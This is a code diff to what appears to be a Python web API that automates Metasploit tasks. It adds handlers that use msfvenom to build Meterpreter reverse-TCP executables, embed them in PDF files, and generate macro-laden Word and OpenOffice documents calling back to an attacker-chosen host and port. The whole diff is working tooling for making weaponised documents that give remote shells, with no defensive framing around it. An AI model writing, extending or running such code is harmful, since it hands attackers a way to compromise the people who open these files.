@@ -388,9 +388,104 @@ def run_winexe_task(task_id: str, base: Path, params: Dict[str, str]):
     _finalize_task(t, base, succeeded=succeeded, err=None if succeeded else f"winexe rc={rc}")
 
 
+def _msfconsole_run(rc_content: str, log_path: Path) -> int:
+    rc_file = log_path.parent / "task.rc"
+    _write_file(rc_file, rc_content)
+    return _spawn(["msfconsole", "-qx", f"resource {rc_file}; exit -y"], log_path)
+
+
+def _copy_msf_local(filename: str, dest: Path) -> bool:
+    src = Path.home() / ".msf4" / "local" / filename
+    if src.exists():
+        _ensure_dir(dest.parent)
+        shutil.copy2(src, dest)
+        return True
+    return False
+
+
+def run_pdf_task(task_id: str, base: Path, params: Dict[str, str]):
+    t = tasks[task_id]
+    with locks[task_id]:
+        t.state = TaskStatus.PREPARING
+    build_log = base / "logs" / "build.log"
+    payload = params.get("payload", "windows/meterpreter/reverse_tcp")
+    lhost = params.get("lhost", "127.0.0.1")
+    lport = params.get("lport", "4444")
+    output_name = params.get("output_name", "document")
+    base_pdf = params.get("base_pdf_path")
+    if not base_pdf or not Path(base_pdf).exists():
+        base_pdf = str(WORKSPACE / "PE" / "original.pdf")
+    exe_path = base / "temp" / "embed.exe"
+    _ensure_dir(exe_path.parent)
+    with locks[task_id]:
+        t.state = TaskStatus.RUNNING
+        t.started_at = time.time()
+        t.logs["build"] = str(build_log)
+    # build simple exe via msfvenom
+    rc0 = _spawn(["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", "exe", "-o", str(exe_path)], build_log)
+    if rc0 != 0:
+        _finalize_task(t, base, succeeded=False, err=f"msfvenom rc={rc0}")
+        return
+    # run msfconsole to embed
+    rc_text = f"""
+use windows/fileformat/adobe_pdf_embedded_exe
+set EXE::Custom {exe_path}
+set FILENAME {output_name}.pdf
+set INFILENAME {base_pdf}
+exploit
+""".strip()
+    rc1 = _msfconsole_run(rc_text, build_log)
+    # copy result
+    pdf_out = base / "output" / f"{output_name}.pdf"
+    ok = _copy_msf_local(f"{output_name}.pdf", pdf_out)
+    _finalize_task(t, base, succeeded=ok, err=None if ok else f"pdf embed rc={rc1}")
+
+
+def run_office_task(task_id: str, base: Path, params: Dict[str, str]):
+    t = tasks[task_id]
+    with locks[task_id]:
+        t.state = TaskStatus.PREPARING
+    build_log = base / "logs" / "build.log"
+    target = params.get("suite_target", "ms_word_windows")  # ms_word_windows|ms_word_mac|openoffice_windows|openoffice_linux
+    payload = params.get("payload", "windows/meterpreter/reverse_tcp")
+    lhost = params.get("lhost", "127.0.0.1")
+    lport = params.get("lport", "4444")
+    output_name = params.get("output_name", "doc_macro")
+    module = None
+    extra = ""
+    if target in ("ms_word_windows", "ms_word_mac"):
+        module = "exploit/multi/fileformat/office_word_macro"
+        ext = ".doc"
+    elif target == "openoffice_windows":
+        module = "exploit/multi/misc/openoffice_document_macro"
+        extra = "set target 0"
+        ext = ".odt"
+    else:
+        module = "exploit/multi/misc/openoffice_document_macro"
+        extra = "set target 1"
+        ext = ".odt"
+    with locks[task_id]:
+        t.state = TaskStatus.RUNNING
+        t.started_at = time.time()
+        t.logs["build"] = str(build_log)
+    rc_text = f"""
+use {module}
+set PAYLOAD {payload}
+set LHOST {lhost}
+set LPORT {lport}
+set FILENAME {output_name}{ext}
+{extra}
+exploit
+""".strip()
+    rc = _msfconsole_run(rc_text, build_log)
+    doc_out = base / "output" / f"{output_name}{ext}"
+    ok = _copy_msf_local(f"{output_name}{ext}", doc_out)
+    _finalize_task(t, base, succeeded=ok, err=None if ok else f"office rc={rc}")
+
+
 # API models
 class CreateTaskRequest(BaseModel):
-    kind: str  # payload|listener|android|winexe
+    kind: str  # payload|listener|android|winexe|pdf|office
     params: Dict[str, str] = {}
 
 class TaskResponse(BaseModel):
@@ -399,7 +494,7 @@ class TaskResponse(BaseModel):
 
 @app.post("/tasks", response_model=TaskResponse)
 def create_task(req: CreateTaskRequest):
-    if req.kind not in ("payload", "listener", "android", "winexe"):
+    if req.kind not in ("payload", "listener", "android", "winexe", "pdf", "office"):
         raise HTTPException(status_code=400, detail="Unsupported kind")
     t, base = _prepare_task(req.kind, req.params)
     # seed defaults
@@ -421,6 +516,10 @@ def create_task(req: CreateTaskRequest):
             run_android_task(t.id, base, t.params)
         elif req.kind == "winexe":
             run_winexe_task(t.id, base, t.params)
+        elif req.kind == "pdf":
+            run_pdf_task(t.id, base, t.params)
+        elif req.kind == "office":
+            run_office_task(t.id, base, t.params)
     threading.Thread(target=runner, daemon=True).start()
     return TaskResponse(task=t)
 
